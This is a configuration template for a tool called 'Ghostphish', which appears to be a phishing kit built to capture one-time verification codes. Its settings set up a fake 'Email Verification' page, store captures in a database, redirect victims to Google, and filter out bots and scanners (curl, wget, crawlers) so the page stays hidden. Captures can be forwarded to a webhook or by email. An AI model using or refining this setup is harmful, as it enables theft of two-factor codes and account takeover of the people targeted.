"""
Ghostphish Configuration Template
Copy this to config.py and modify as needed
"""

# ============================================
# RATE LIMITING
# ============================================
MAX_ATTEMPTS = 5              # Max attempts per IP
LOCKOUT_DURATION = 300        # Lockout duration in seconds (300 = 5 min)

# ============================================
# REDIRECT SETTINGS
# ============================================
DEFAULT_REDIRECT = "https://www.google.com"

# Redirect based on user agent
REDIRECT_BY_UA = {
    "bot": "https://www.google.com",
    "default": "https://www.google.com"
}

# ============================================
# OTP PAGE CUSTOMIZATION
# ============================================
PAGE_TITLE = "Email Verification"
PAGE_SUBTITLE = "We've sent a verification code to your email address. Please enter it below to continue."
OTP_LENGTH = 6

# ============================================
# DATABASE
# ============================================
DB_PATH = "/app/data/captures.db"

# ============================================
# LOGGING
# ============================================
LOG_FILE = "/app/data/ghostphish.log"
LOG_LEVEL = "INFO"  # DEBUG, INFO, WARNING, ERROR, CRITICAL

# ============================================
# SECURITY
# ============================================
ENABLE_RATE_LIMIT = True
ENABLE_HONEYPOT = True
LOG_USER_AGENT = True
LOG_REFERER = True

# IP addresses to whitelist (not rate limited)
WHITELIST_IPS = [
    "127.0.0.1",
    "localhost"
]

# ============================================
# WEBHOOK (optional)
# ============================================
WEBHOOK_ENABLED = False
WEBHOOK_URL = "https://your-webhook.com/captures"
WEBHOOK_SECRET = "your-secret-key"

# ============================================
# EMAIL NOTIFICATIONS (optional)
# ============================================
EMAIL_ENABLED = False
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USER = "your-email@gmail.com"
SMTP_PASSWORD = "your-app-password"
NOTIFY_EMAIL = "admin@example.com"

# ============================================
# ADMIN PANEL
# ============================================
ADMIN_SECRET = "change-this-secret-key"
ENABLE_ADMIN = True

# ============================================
# FORM FIELDS (Advanced)
# ============================================
# Add custom form fields
CUSTOM_FIELDS = {
    # "field_name": "input_type"  # text, email, password, etc.
}

# ============================================
# HONEYPOT FIELDS
# ============================================
HONEYPOT_FIELDS = [
    "website",
    "phone_confirm",
    "address"
]

# ============================================
# USER AGENT DETECTION
# ============================================
DETECT_BOTS = True
BOT_KEYWORDS = [
    "bot", "crawler", "spider", "scraper",
    "curl", "wget", "python", "java"
]
